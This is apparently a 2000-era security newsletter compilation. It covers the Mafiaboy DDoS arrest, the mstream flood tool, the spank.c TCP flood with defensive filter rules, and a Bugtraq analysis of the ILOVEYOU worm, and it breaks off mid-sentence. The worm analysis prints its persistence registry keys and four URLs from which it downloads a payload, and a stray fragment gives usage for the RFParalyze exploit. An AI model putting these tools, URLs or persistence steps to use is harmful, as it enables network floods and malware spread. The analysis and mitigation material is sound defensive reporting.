      Mafiaboy, who cannot be named under a Canadian law that protects
      the identities of juveniles charged with crimes, was arrested on
      Saturday and formally charged on Monday, the Royal Canadian
      Mounted Police told a news conference.

      Police Inspector Yves Roussel said investigators were able to track
      the 15-year-old boy in part because he bragged about his alleged
      exploit in messages sent to Internet chat rooms.

      ``This individual, using the nickname Mafiaboy, would have publicized
      on many occasions that he was the person responsible for those
      attacks,'' Roussel said.

      ``The prosecution intends to demonstrate before the court that
      Mafiaboy is responsible for the denial-of-service attack that was
      launched for more than four hours on the 8th of February against the
      CNN site and all the sites that are hosted by this company -- and
      we're talking roughly 1,200 of those,'' Roussel said.

      The Mounties charged Mafiaboy with two counts of mischief to data,
      which carries a maximum sentence for juveniles up to two years in
      detention and a C$1,000 ($675) fine.

      Mafiaboy has been released but his bail conditions include not using a
      computer except for academic purposes and under the supervision of
      a teacher.

      He is also prohibited from connecting to the Internet or frequenting
      stores that sell computers or computer paraphernalia. Police seized all
      of the computers and related material found at the boy's home.

      Police said the investigation into the series of cyber attacks that
      locked up some of the Internet's most popular Web sites in February
      continues and there could be other arrests.

      The ``denial-of-service'' attacks in early February shut down such
      Web sites as Yahoo! (YHOO.O), Amazon.com (AMZN.O), eBay
      (EBAY.O) BUY.COM (BUYX.O), Excite (ATHM.O) and E-Trade
      (EGRP.O).

      Mafiaboy was not charged in connection with the attacks against
      those sites. The Mounties and FBI declined to say whether they had
      identified other suspects in the wider investigation involving those
      sites.

      ``We had to do something to prevent further actions from Mafiaboy.
      That's why we arrested him last weekend,'' Roussel said.

      ``However, the investigation is ongoing and there is literally tons of
      information to scrutinize. There is a possibility that other people might
      be arrested,'' he added.

      Police would not comment on whether Mafiaboy acted alone in the
      Web assault on CNN's site or was part of a group. They also would
      not divulge how many computers he may have used.

      In Washington, U.S. Attorney General Janet Reno said on
      Wednesday that Mafiaboy must face punishment.

      ``I think that it's important first of all that we look at what we've seen
      and let young people know that they are not going to be able to get
      away with something like this scot-free,'' Reno told reporters on
      Capitol Hill. ``There has got to be a remedy, there has got to be a
      penalty.''

      Reno said the U.S. government continued to work with industry on
      that incident and others, now that law enforcement has shown it can
      crack cyber-attack cases.

      ``I believe this recent breakthrough demonstrates our capacity to
      track down those who would abuse this remarkable new technology,
      and track them down wherever they may be,'' she said.

      In the February Web site assaults, attackers meticulously obtained
      remote control of computers around the world. They then used the
      computers to bombard the targeted Web sites, flooding them with so
      much data that legitimate users were temporarily denied access or
      service.

      Police refused to provide any details that would identify Mafiaboy, or
      comment on speculation that he attends a suburban Montreal high
      school. The Mounties' Inspector Roussel downplayed Mafiaboy's
      computing hacking abilities, saying he likely did not have to devise any
      special programs to gain access to targeted computers.

      ``It is our evaluation that Mafiaboy was not that good, actually. He
      had a good knowledge of computers, however, he was not what we
      could call a genius in that field,'' Roussel said. William Lynn, an FBI
      agent who is assistant legal attache at the U.S. Embassy in Ottawa,
      said investigators were not surprised to discover that Mafiaboy was a
      juvenile.

      ``In our profiling of these types of matters it is common for us to
      consider this as a possibility,'' he told reporters.

      The Mounties said their investigation included their Computer
      Investigation and Support Unit in Montreal, a division of the FBI, the
      U.S. Justice Department and the U.S. National Infrastructure
      Protection Center. Canadian police joined the hunt for the hackers in
      mid-February as investigators suspected that a Canadian server had
      been used in the assault.

      The February attacks alarmed Internet users across the globe, cost
      Web sites millions of dollars in revenue and shook the electronic
      commerce industry because of the apparent ease with which major
      sites were made inaccessible.

      ABC's television news division said on Tuesday that investigators
      were allegedly able to trace the attacks to Mafiaboy by examining the
      log files of a computer at a University of California, Santa Barbara,
      research lab that was among those used to attack CNN.com. A
      hacker electronically broke into the UCSB computer on Feb. 8 and
      instructed it to send large amounts of traffic to CNN.com's Web site,
      ABC quoted campus network program Kevin Schmidt as saying.

      Jeffrey Johnson, chief executive of Meta Secure-com Solutions, an
      Atlanta-based electronic commerce security firm, said that in such
      Web attacks, hackers usually use several ''zombie'' computers to
      which they had already illegally gained remote control to flood the
      target site with incoming streams of nuisance data.

      Johnson said Mafiaboy had been well known in the hacker
      underground and in a popular Internet chat room for about two years.
      Mafiaboy stood out from others because he often bragged in the
      online chat room about how he planned to take down a few Web
      sites.

      ``He was looking for bragging rights. He was doing it to show that he
      has power,'' Johnson said.

11.1 Mafiaboy:Canadian Arrest Made in February Web Attacks 
     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

      http://abcnews.go.com/wire/US/reuters20000419_1950.html

      WIRE:04/19/2000 10:10:00 ET
      Canadian Arrest Made in
      February Web Attacks
                   


      MONTREAL (Reuters) - Canadian
      police were set to reveal  details on
      Wednesday of an arrest made in
      connection with  February's cyber
      attacks that jammed some of the
      Internet's most  popular Web sites, amid
      reports the suspect is a 15-year-old
      known online as Mafiaboy.  

      The Royal Canadian Mounted Police said on Tuesday
      that  charges had been brought against what they
      described only as "a  person" in the cyber attacks.  

      "The investigation has given authorities the opportunity to
       bring light on Internet attacks that have strongly shaken
      the  heart of electronic commerce worldwide, causing
      losses that were  evaluated at many hundred millions of
      U.S. dollars," the force  said in a statement.  

      The "denial-of-service" attacks on Feb. 2 shut down such
       popular Web sites as Yahoo! (YHOO.O), Amazon.com
      (AMZN.O) and  eBay (EBAY.O) for hours.  

      In the assault, attackers meticulously obtained remote
       control of over computers around the world. They then
      used the  computers to bombard the targeted Web sites,
      flooding them with  so much data that legitimate users
      were temporarily denied  access or service.  

      The Mounties declined to comment further on the arrest,
      but  ABC News reported on Tuesday that a 15-year-old
      boy who used the  online moniker Mafiaboy was arrested
      over the weekend in the  Montreal area and charged on
      Monday.  

      The news division of the U.S. television network said
       records in the case had been sealed because of the
      suspect's  age. Under Canada's Young Offenders Act,
      authorities are not  allowed to reveal the identities of
      individuals less than 17  years of age who are charged
      with crimes and set to be tried in  juvenile court.  

      The Canadian police promised to release more
      information at  a news conference in Montreal at 10:30
      a.m. EDT (1430 GMT) on  Wednesday.  

      The U.S. Justice Department and the FBI were expected
      to  make a statement afterward. No comment was
      immediately available  from the department.  

      The Mounties said their investigation included their
       Computer Investigation and Support Unit in Montreal, a
      division  of the FBI, the U.S. Justice Department and U.S.
      National  Infrastructure Protection Center. Canadian
      police joined the  hunt for the hackers in mid-February as
      investigators suspected  that a Canadian server had been
      used in the assault.  

      The February attacks alarmed Internet users across the
       globe, cost Web sites millions of dollars in revenue and
      shook  the electronic commerce industry because of the
      apparent ease  with which major sites were made
      inaccessible.  

      ABC said investigators were allegedly able to trace the
       attacks to Mafiaboy by examining the log files of a
      computer at  a University of California, Santa Barbara,
      research lab that was  among those used to attack
      CNN.com (TWX.N).  

      A hacker electronically broke into the UCSB computer
      on Feb.  8 and instructed it to send large amounts of
      traffic to  CNN.com's Web site, ABC quoted campus
      network programmer Kevin  Schmidt as saying.  

      ABC News said the FBI obtained chat room logs
      allegedly  showing that Mafiaboy had asked others what
      sites he should take  down before they were attacked.  

      Internet security expert Michael Lyle told the network he
       had communicated with Mafiaboy and the 15-year-old
      said he had  attacked not only CNN.com but also
      E+TRADE and several smaller  Web sites.  

      A subscriber called Mafiaboy previously held two
      accounts  with Delphi Supernet, a Montreal Internet
      service provider that  Toronto-based ISP Internet Direct
      bought last year.  

      The accounts were closed in March 1998 because
      Mafiaboy  violated subscriber policies, but Internet Direct
      would not say  what the violations were.

      WASHINGTON (Reuters) - U.S. Attorney General Janet Reno said
      on Wednesday a 15-year-old boy arrested in Canada for jamming
      the CNN.com Web site and other sites in February must face
      punishment.

      Canadian police in Montreal announced charges against the
      15-year-old hacker known online as ``Mafiaboy'' for jamming the
      CNN.com Web site and up to 1,200 CNN-hosted sites for four
      hours on Feb. 8.

      ``I think that it's important first of all that we look at what we've seen
      and let young people know that they are not going to be able to get
      away with something like this scot-free,'' Reno told reporters on
      Capitol Hill. ``There has got to be a remedy, there has got to be a
      penalty.''

      Reno said the U.S. government continued to work with industry on
      that incident and others, now that law enforcement has shown it can
      crack cyber-attack cases.

      ``I believe this recent breakthrough demonstrates our capacity to
      track down those who would abuse this remarkable new technology,
      and track them down wherever they may be,'' she said.

      Mafiaboy Suspected       FBI Has Evidence That He and Others Launched 
      Web Attacks, Expert Says

      By Jonathan Dube

      Feb. 16  A hacker who calls himself mafiaboy is believed to be 
      responsible for at least two of the attacks on leading Web sites, a 
      security expert tells ABCNEWS.com.  FBI seeks hackers in Web attacks. 
      

           Chat room logs now in the possession of the FBI show that mafiaboy 
           asked others what sites he should take down  before the sites were 
           attacked, Internet security expert Michael Lyle said.            In a 
           later conversation with Lyle, mafiaboy claimed credit for attacking 
           CNN.com, E*TRADE and several smaller sites, and he shared technical 
           information that only someone involved in the attacks would know, 
           Lyle said. The FBI now has reason to believe that the attacks last 
           week that took down seven leading Web sites and at least six smaller 
           Web sites were launched by several people, acting independently. 
           Mafiaboy, who has been described as a 15-year-old Canadian, is 
           believed to be a copycat who launched his attacks only after Yahoo! 
           was knocked offline on Feb. 7. Mafiaboys Claims Seem Credible Dozens 
           of hackers have claimed credit for the attacks in online chats, but 
           Lyle says mafiaboy is the only one so far who appears to be credible. 
           Mafiaboy was saying What should I hit next? What should I hit 
           next? and people on the channel were suggesting sites, and mafiaboy 
           was saying, OK, CNN, said Lyle, the chief technology officer for 
           Recourse Technologies Inc., an Internet security company in Palo 
           Alto, Calif. And shortly thereafter the people on the channel would 
           be talking about CNN going down. If you look at the time stamps on 
           the logs, they also coincide with CNN going down. Lyle said the log 
           files show similar discussions prior to the Feb. 9 attacks on E*TRADE 
           and several other smaller sites. Chat room log files can be faked, 
           but Lyle said hes spoken with a number of others who witnessed the 
           conversations live and verified their authenticity. 

      Mafiaboy Knows Details       Moreover, Lyle said he spoke with mafiaboy 
      over the Internet last Thursday and again last Friday and those 
      conversations bolstered the evidence against the young hacker. Mafiaboy 
      also said he was breaking into computers that were using a program called 
      WUFTP, which is often used to exchange data on university computers, Lyle 
      said. Mafiaboy said these computers were using an old version of WUFTP 
      that had security flaws in it and thus he was able to install the attack 
      software on the computers, Lyle said. He is believed to have installed 
      attack software called Tribal Flood Network, or TFN, on dozens of 
      computers, making them into zombies that he could then instruct to 
      launch the attacks. Lyle said mafiaboy told him specific details about the 
      ports that he used to connect with the zombie computers and launch the 
      attacks  information that only someone involved in the attack would know. 

      More Than One Attacker       The reason investigators believe different 
      culprits were responsible for some of the attacks is that the software 
      tools used to launch the attacks on Yahoo! and eBay were different than 
      those used to attack CNN.com and E*TRADE, Lyle said. The attacks on 
      CNN.com and E*TRADE are believed to have been launched using TFN, a 
      software program thats widely available on the Internet. The attacks on 
      Yahoo! and eBay were launched using a more sophisticated set of tools, he 
      said. Toronto-based Internet service provider Internet Direct said the 
      Royal Canadian Mounted Police had warned it that a subscriber called 
      mafiaboy previously held two accounts with Delphi Supernet, a Montreal 
      ISP the company bought last year. The accounts were closed in March 1998 
      because mafiaboy violated subscriber policies, but Internet Direct would 
      not say what the violations entailed. Lyle says he has turned his 
      information over to the FBI and has been working with investigators. Based 
      on his conversations with mafiaboy, Lyle said the teen likely committed 
      the attacks to boost his notoriety within the hacker community. Theres 
      this real effort among the people on all these channels to try and stand 
      out and look like the best hacker, or one of the best, Lyle said. And I 
      think that thats what he was searching after. That really explains why he 
      would brag the way he did about it. 

      FBI Interviews Coolio       ABCNEWS has also learned that the FBI has 
      interviewed a hacker called coolio in connection with last weeks Web 
      attacks, but he denied any involvement. FBI officials told ABCNEWS Brian 
      Ross they had tracked down the teenage hacker in Southern California 
      because they believed he might have useful information for their 
      investigation. Coolio is well known to authorities as a member of Global 
      Hell, a group of teenagers who have hacked into White House and 
      Department of Defense computer systems. The officials said members of 
      Global Hell are still under investigation in connection with last weeks 
      Web attacks. The FBI also wants to question a hacker known as nachoman. 
      Officials have been careful to say they are not suspects, but just want to 
      talk to them about important information relating to the attacks. 

      Fast-Developing Leads       In Washington, FBI Director Louis Freeh said 
      today investigators are running down hundreds of leads related to the Web 
      attacks, but still face substantial hurdles. There are fast developing 
      leads as we speak, Freeh told a Senate subcommittee. Freeh said the 
      investigation has led the FBI to at least four other countries, including 
      Canada and Germany. He also said FBI field offices in five cities are 
      participating in the investigation: Los Angeles, San Francisco, Atlanta, 
      Boston and Seattle. The FBI began investigating after leading Web portal 
      Yahoo! was attacked and made inaccessible for several hours on Feb. 7. 
      Then, on Feb. 8, Buy.com, Amazon.com, eBay and CNN.com were assaulted. And 
      on Feb. 10, technology site ZDNet and online trading site E*TRADE suffered 
      attacks. As many as 13 Web sites may have been attacked. Known as 
      denial-of-service attacks, the assaults effectively overloaded Web sites 
      with mock traffic so that real users couldnt access the sites. The 
      culprits took over computers in various parts of the world and used them 
      to bombard the victims sites with data. Investigators have located more 
      than a half-dozen computers used in last weeks attacks. Computers at two 
      California universities, a Midwestern school, a Berlin university, a 
      non-university site in Southern California, a home business in Oregon, and 
      machines at least four companies were used as zombies.

11.4 Mafiaboy:Hacker cripples Area 51 site for 36 hours
     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  
     
     04/21/00- Updated 11:36 AM ET                                          

     Hacker cripples Area 51 site for 36 hours

     RALEIGH, N.C. (AP) - A hacker disrupted service for 36 hours to the Web 
     site that displays detailed satellite images of Area 51, the top-secret 
     Air Force site in Nevada. 

     Raleigh-based Aerial Images Inc. said the hacker struck six hours after 
     five images of the desert proving ground were loaded Monday night onto the 
     site, www.terraserver.com. 

     The attack, combined with traffic 10 times what the site usually bears, 
     meant millions of people had difficulty accessing the site or could not 
     connect with it at all, company officials said. Service was disrupted 
     until Thursday. 

     ''I won't tell you it's completely solved,'' said John Hoffman, Aerial 
     Images president. ''We've taken steps to mitigate its effect. It's almost 
     a fact of being online these days.'' 

     Hoffman declined to provide details of the attack, citing an ongoing 
     investigation. 

     The Air Force only recently acknowledged that Groom Dry Lake Air Force 
     Base even exists. Among UFO aficionados, it has long been known simply as 
     Area 51, the base's designation on old Nevada test site maps. They believe 
     that unidentified flying objects from other worlds are hidden there.

    xx.x  [ISN] Clearing up questions about denial of service attacks
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
      
      [Forwarded by: Mark Arena <marena@iinet.net.au>]
      
      Hi all,
      
      I just thought I'd clear up all these rumors, questions etc regarding
      the denial of service attacks which happened a while ago.
      
      1) Did mafiaboy use trinoo or smurf?
      He didnt use either. He used a program called mstream and yes its
      private. It basically is similar to trinoo. It comprises of a client
      and a server. With the server it listens on port 7983 and you specify
      the hosts which will connect to the server on that port. For that
      reason you must have been added to the server to packet from it. On
      the server.c program is appears like this:
      char *m[]={
       "1.1.1.1", /* first master */
       "2.2.2.2", /* second master */
       "3.3.3.3", /* third master etc */
       0 };
      
      Now as for the client you can define a password, serverfile and max
      number of users to use the client at one time. The client then
      connects to the servers and gets the servers to send all crap data to
      the host you specify and hence if you got enough servers will take
      them down eg as mafiaboy did.
      
      2) So did mafiaboy actully hack anything?
      The answer is yes. All the machine he installed the server on he had
      to have root. Therefore he must have hacked a lot of machines in
      preparation for the attack on the sites.
      
      3) Did mafiaboy take out all the sites?
      No, mafiaboy only took out yahoo, etrade and some others which I cant
      remember. Coolio took out the rest. No matter what you're told I
      assure you Coolio took out the rest.
      
      4) How come it took so long for mafiaboy to get arrested?
      Simple he hanged low and the fbi etc had not enough evidence to make
      an arrest that was until his outburst on self-evident's msg board. His
      allowed the fbi etc to swoop swiftly and quickly.
      
      Now its time for my opinion:
      1) Do you think mafiaboy will get convicted?
      Well it depends, if mafiaboy admits to dos'ing those sites then yes I
      believe he will be convicted then again if he denies it I believe they
      won't have enough evidence on him. The only reason they caught him is
      that his nick etc was posted on www.self-evident.com He also said to a
      person I know that he destroyed the hard drive in a fire which would
      give the fbi no physical evidence at his end.
      
      Mafiaboy's story:
      Here is a quick rephraze of what mafiaboy has said in channels before
      he got arrested. His nick has been edited out for various reasons.
      <> god fucking damnit
      <> i wish i can go back in time
      <> and undo what i did
      
      In closing I'll tell you how I know this. Firstly I have spoken to
      people associated with mafiaboy. I also have the program which he used
      to take out the sites and no I won't send you it. Any other questions
      etc direct them to me and i'll try answering them.

13.0  [MM] Cybercrime Solution Has Bugs 
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

      Cybercrime Solution Has Bugs 
      by Declan McCullagh 
      
      3:00 a.m. May. 3, 2000 PDT 
      WASHINGTON -- U.S. and European police agencies will receive new powers to 
      investigate and prosecute computer crimes, according to a preliminary 
      draft of a treaty being circulated among over 40 nations. 

      The Council of Europe's 65KB proposal is designed to aid police in 
      investigations of online miscreants in cases where attacks or intrusions 
      cross national borders. 

      
      But the details of the "Draft Convention on Cybercrime" worry U.S. civil 
      libertarians. They warn that the plan would violate longstanding privacy 
      rights and grant the government far too much power. 

      The proposal, which is expected to be finalized by December 2000 and 
      appears to be the first computer crime treaty, would: 

      Make it a crime to create, download, or post on a website any 
      computer program that is "designed or adapted" primarily to gain 
      access to a computer system without permission. Also banned is 
      software designed to interfere with            the "functioning of a 
      computer system" by deleting or altering data. 

      Allow authorities to order someone to reveal his or her passphrase 
      for an encryption key. According to a recent survey, only Singapore 
      and Malaysia have enacted such a requirement into law, and experts 
      say that in the United            States it could run afoul of 
      constitutional protections against self-incrimination. 

      Internationalize a U.S. law that makes it a crime to possess even 
      digital images that "appear" to represent children's genitals or 
      children engaged in sexual conduct. Linking to such a site also would 
      be a crime. 

      Require websites and Internet providers to collect information about 
      their users, a rule that would potentially limit anonymous remailers. 

      U.S. law enforcement officials helped to write the document, which was 
      released for public comment last Thursday, and the Justice Department is 
      expected to urge the Senate to approve it next year. Other non-European 
      countries       actively involved in negotiations include Canada, Japan, 
      and South Africa. 

      During recent testimony before Congress, Attorney General Janet Reno 
      warned of international computer crime, a claim that gained more 
      credibility last month with the arrest of alleged denial-of-service 
      culprit Mafiaboy in Canada. 

      "The damage that can be done by somebody sitting halfway around the world 
      is immense. We have got to be able to trace them, and we have made real 
      progress with our discussions with our colleagues in the G-8 and in the 
      Council       of Europe," Reno told a Senate appropriations subcommittee 
      in February, the week after the denial-of-service attacks took place. 

      "Some countries have weak laws, or no laws, against computer crimes, 
      creating a major obstacle to solving and to prosecuting computer crimes. I 
      am quite concerned that one or more nations will become 'safe havens' for       
      cyber-criminals," Reno said. 

      
      Civil libertarians say the Justice Department will try to pressure the 
      Senate to approve the treaty even if it violates Americans' privacy 
      rights. 

      "The Council of Europe in this case has just been taken over by the U.S. 
      Justice Department and is only considering law enforcement demands," says 
      Dave Banisar, co-author of The Electronic Privacy Papers. "They're using 
      one more       international organization to launder U.S. policy." 

      Banisar says Article 6 of the measure, titled "Illegal Devices," could ban 
      commonplace network security tools like crack and nmap, which is included 
      with Linux as a standard utility. "Companies would be able to criminalize 
      people who       reveal security holes about their products," Banisar 
      said. 

      "I think it's dangerous for the Internet," says Barry Steinhardt, 
      associate director of the American Civil Liberties Union and a founder of 
      the Global Internet Liberty Campaign. "I think it will interfere with the 
      ability to speak       anonymously." 

      "It will interfere with the ability of hackers -- using that term in a 
      favorable light -- to test their own security and the security of others," 
      Steinhardt said. 

      Solveig Singleton, director of information studies at the libertarian Cato 
      Institute says it's likely -- although because of the vague language not 
      certain -- that anonymous remailers will be imperiled. 

      The draft document says countries must pass laws to "ensure the 
      expeditious preservation of that traffic data, regardless whether one or 
      more service providers were involved in the transmission of that 
      communication." A service       provider is defined as any entity that 
      sends or receives electronic communications. 

      Representing the U.S. in the drafting process is the Justice Department's 
      Computer Crime and Intellectual Property section, which chairs the G-8 
      subgroup on high-tech crime and also is involved with a cybercrime project 
      at the       Organization of American States. In December 1997 Reno 
      convened the first meeting on computer crime of the G-8 nations. 

      A recent White House working group, which includes representatives from 
      the Justice Department, FBI, and Secret Service has called for 
      restrictions on anonymity online, saying it can provide criminals with an 
      impenetrable shield. So       has a report from a committee of the 
      European Parliament. 

      Other portions of the treaty include fairly detailed descriptions of 
      extradition procedures and requirements for countries to establish 
      around-the-clock computer-crime centers that police groups in other 
      countries may contact for       immediate help. 

      The Council of Europe is not affiliated with the European Union, and 
      includes over 40 member nations, including Russia, which joined in 1996. 

      After the Council of Europe's expert group finalizes the proposed treaty, 
      the full committee of ministers must adopt the text. Then it will be sent 
      to countries for their signatures. Comments can be sent to daj@coe.int.

14.0  [IND] The new spank.c DoS attack tool source and an analysis paper by 1st
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
      
      
      ------------------------------------------------
      Explanation of the 'spank' attack
      -- a new breed stream/raped
      ------------------------------------------------
      
      By: lst (yardley@uiuc.edu)
      
      This is a tad different than the previous release.  Stream/Raped mearly 
      flooded the host with ack's (or no flags) and came from random ips with 
      random sequence numbers and/or ack numbers.  The difference now is that 
      this not only does the previous stuff, but also directly attacks from and 
      to multicast addresses as well.  Just as before, rate limiting should be 
      done to counteract its effect (the same idea as ICMP_BANDLIM).  The 
      multicast handling should also be checked to verify that it is behaving 
      properly.
      
      The attacker specifies the port[s] that they want to send the attack to, 
      depending on what ports are selected, you will have different net 
      results.  If the port is an open port, then you will possibly have a longer 
      kernel path to follow before the drop.  Therefore, a smart attacker will 
      hit open ports, but havoc can also come about from random ports due to 
      states and processing.
      
      In the best case scenario, you will experience only the lag of the flood 
      and the lag of the processing (currently) and then be fine when the 
      attacker stops,  In the worst case, you lockup, kill the network, and 
      possibly have to reboot.  Once you patch it, you deal with a lot less 
      processing time (the drops are handled without the RST flag when 
      appropriate--bandlim type idea).  In other words, you go to the drop 
      routine instead of dropwithrst silencing your response, which decreases 
      your processing time, the hit on your network, and the effect of the flood 
      (once a threshold is reached, all those bad packets are silently dropped 
      and the attack has less of a net effect).
      
      The filters that were presented at the beginning of this email will block 
      all multicast packets that come out (and in) the tcp stack I have been
      getting mailed a lot about this.  Here is why I said the previous 
      statement.  Receiving a packet with no flags is considered an illegal
      packet (obviously) and is often dumped, however, as we have seen in 
      the past, illegal packets often wreak havoc and often go untested.
      
      There is very little that "raped.c" or "stream.c" actually showed as 
      problems in the TCP/IP stacks.  The true problem lies more in the effects 
      of the response (caused by the attack).  This is the same concept as the 
      SYN floods of yesteryear, and the same type of thing will be done to handle 
      it.  The main difference is that it will be on a simpler note because there 
      isn't much need for a "cookie" based system.  One should just throttle the 
      response of the reset packets which in turn will help stop the storm that 
      you generate and in general, harden the tcp/ip stack to behave the way it 
      is supposed to.
      
      The main effect of this attack is that you are shooting back RST+ACK's at 
      all the spoofed hosts.  Obviously, a lot of these hosts will not exist and 
      you will get ICMP unreaches (as an example) bounced back at you.  There are 
      other possibilities as well, but unreach would be the most common 
      (redirects might be common as well although i did not spend the time to 
      analyze that).  The ones that don't respond back may send you some packets 
      back as well (depending on if the port was valid or not and what their 
      firewall rules are).  This type of attack is complicated by the multicasts, 
      and the effect is amplified as well.  All in all, it becomes very nasty 
      very quick.  Basically, this causes a nice little storm of packets, in the 
      ideal case.
      
      Note that I said ideal case in the previous paragraph.  This is not always 
      the observed behavior.  It all depends on what is on the subnet, what type 
      of packets are recieved, what rules and filters you have setup, and even 
      the duration of the flood.  It has been pointed out several times that the 
      machine will go back to normal once the attack is stopped, which is exactly 
      why something like ICMP_BANDLIM will work.
      
      I have also been asked a lot about what this "bug" affects.  I have seen it 
      have effects on *BSD, Linux, Solaris, and Win* as far as OS's go.  It has 
      also seemed to affect some hubs, switches, routers, or gateways since 
      entire subnets have "disappeared" briefly after the attack.  The multicast 
      attack seems to be more deadly to teh network than the previous attack and 
      its affects get amplified and even carried over to the rest of the network 
      (bypassing secluded network bounds).  I don't have more specifics on the 
      systems affected because of the difficulty in testing it (and keeping the 
      network up) since I do not have local access to the networks that I tested 
      on, and remote access gets real ugly real fast.
      
      Another possibility that has been suggested as to why some machines die is 
      that the machine's route table is being blown up by the spoofed 
      packets.  Each spoofed packet has a different source address which means 
      that a temporary route table entry is being created for each one.  These 
      entries take time to timeout.  Use 'vmstat -m' and check the 'routetbl' 
      field while the attack is going on.
      
      Route table entries can be controlled somewhat under freebsd with:
      
      [root@solid]::[~] sysctl -a | fgrep .rt
      net.inet.ip.rtexpire: 3600
      net.inet.ip.rtminexpire: 10
      net.inet.ip.rtmaxcache: 128
      
      You can do the following, to help if the route table is at least part of 
      the problem:
      
      sysctl -w net.inet.ip.rtexpire=2
      sysctl -w net.inet.ip.rtminexpire=2
      
      Things that will help:
      
      1. Drop all multicast packets (ingress and egress) that are addressed to 
         the tcp stack because multicasts are not valid for tcp.
      2. Extend bandwidth limiting to include RST's, ACK's and anything else 
         that you feel could affect the stability of the machine.
      3. Don't look for listening sockets if the packet is not a syn
      
      I hope that this helps, or explains a little more at least.
      
      ---------------------------------------------------
      Temporary remedy
      ---------------------------------------------------
      
      If you use ipfilter, this MAY help you, but the issue is quite a bit 
      different than the previous issue.
      
      -- start rule set --
      block in quick proto tcp from any to any head 100
      block in quick proto tcp from 224.0.0.0/28 to any group 100
      pass in quick proto tcp from any to any flags S keep state group 100
      pass out proto tcp from any to any flags S keep state
      pass in all
      -- end rule set --
      
      optionally, a rule like the following could be inserted to handle outgoing 
      packets (if they send from the firewall somehow) but you have bigger 
      problems than the attack if that is the case.
      
      -- start additional rule --
      block out proto tcp from any to 224.0.0.0/28
      -- end additional rule --
      
      That will help you "stop" the attack (actually it will just help minimize 
      the affects), although it will still use some CPU though
      
      Note: If you use IPFW, there is no immediate way to solve this problem due 
      to the fact that it is a stateless firewall.  If you are getting attacked, 
      then temporarily use ipfilter (or any other state based firewall) to stop 
      it.  Otherwise, wait for vendor patches or read more about the explanation 
      for other possible workarounds.

      -----------------------
      Conclusion
      -----------------------
      
      This bug was found in testing.  It seems a bit more lethal than the 
      previous and should be addressed as such.  Patches should be available now, 
      but I do not follow all the platforms.

              - Usage: RFParalyze <IP address> <NetBIOS name>
      
              where <IP address> is the IP address (duh) of the target (note:
              not DNS name).  <NetBIOS name> is the NetBIOS name (again, duh) of
              the server at the IP address given.  A kiddie worth his scripts
              should be able to figure out how to lookup the NetBIOS name.  
              Note: NetBIOS name must be in upper case.

              binary-only exploit found in the wild.

16.0 [MM] New worm: ILOVEYOU spreads via e-mail attachments
     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
     
     This email worm originated in the Phillipines, when I first became aware
     of it Britain was being hit hard by the nuisance, and by late afternoon
     the same day it had proliferated across the net to the U.S and Canada
     I got a call from my sister at work who had recieved 16 ILOVEYOU emails
     at that time, later on the media began reporting it and in my news
     emails that were warning of the virus the very same emails were themselves
     infected and multiple copies were received. 
     
     Not 24hrs had passed before several variations of the insiduous pest had
     appeared such as the JOKE and VERY FUNNY variations. You'd think we were
     past this sort of annoyance but it seems shoddy programming and planning
     is going to be a fact of life for a good while to come yet. - Ed

      Subject:ILOVEYOU worm
      Date:Wed May 03 2000 18:56:18
      Author: Elias Levy
      Message-ID:<20000504095618.N24513@securityfocus.com>
     
     
     A new VB worm is on the loose. This would normally not be bugtraq
     material as it exploits no new flaws but it has spread enough that it
     warrants some coverage. This is a quick and dirty analysis of what it does.
     
     The worm spreads via email as an attachments and via IRC as a DCC download.
     
     The first thing the worm does when executed is save itself to three
     different locations. Under the system directory as MSKernel32.vbs and
     LOVE-LETTER-FOR-YOU.TXT.vbs and under the windows directory as
     Win32DLL.vbs.
     
     It then creates a number of registry entries to execute these programs
     when the machine restarts. These entries are:
     
     HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\MSKernel32
     HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\Win32DLL
     
     It will also modify Internet Explorer's start page to point to a web page
     that downloads a binary called WIN-BUGSFIX.exe. It randomly selects between
     four different URLs:
     
     http://www.skyinet.net/~young1s/HJKhjnwerhjkxcvytwertnMTFwetrdsfmhPnjw6587345gvsdf7679njbvYT/WIN-BUGSFIX.exe
     http://www.skyinet.net/~angelcat/skladjflfdjghKJnwetryDGFikjUIyqwerWe546786324hjk4jnHHGbvbmKLJKjhkqj4w/WIN-BUGSFIX.exe
     http://www.skyinet.net/~koichi/jf6TRjkcbGRpGqaq198vbFV5hfFEkbopBdQZnmPOhfgER67b3Vbvg/WIN-BUGSFIX.exe
     http://www.skyinet.net/~chu/sdgfhjksdfjklNBmnfgkKLHjkqwtuHJBhAFSDGjkhYUgqwerasdjhPhjasfdglkNBhbqwebmznxcbvnmadshfgqw237461234iuy7thjg/WIN-BUGSFIX.exe
     
     I've not been able to obtain copy of the binary to figure out what it does.
     This does mean the worm has a dynamic components that may change its
     behavior any time the binary is changed and a new one downloaded.
     
     The worm then changes a number of registry keys to run the downloaded binary
     and to clean up after itself.
     
     HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\WIN-BUGSFIX
     HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page
             about:blank
     
     The worm then creates an HTML file that helps it spread,
     LOVE-LETTER-FOR-YOU.HTM. This is the file DCC'ed to others on IRC.
     
     The worm then spreads to all addresses in the Windows Address Book by
     sending the file LOVE-LETTER-FOR-YOU.TXT.vbs as an attachment. The
     email starts:
     
             kindly check the attached LOVELETTER coming from me.
     
     Then the virus searches for attached drives looking for files with
     certain extensions. It overwrites files ending with vbs, and vbe.
     It overwrites files ending with js, jse, css, wsh, sct, and hta, and
     then renames them to end with vbs. It overwrites files ending with jpg
     and jpeg and appends .vbs to their name. It finds files with the name
     mp3 and mp3, creates vbs files with the same name and sets the hidden
     attribute in the original mp* files.
     
     The it looks for the mIRC windows IRC client and overwrites the script.ini
     file if found. It modifies this file to that it will DCC the
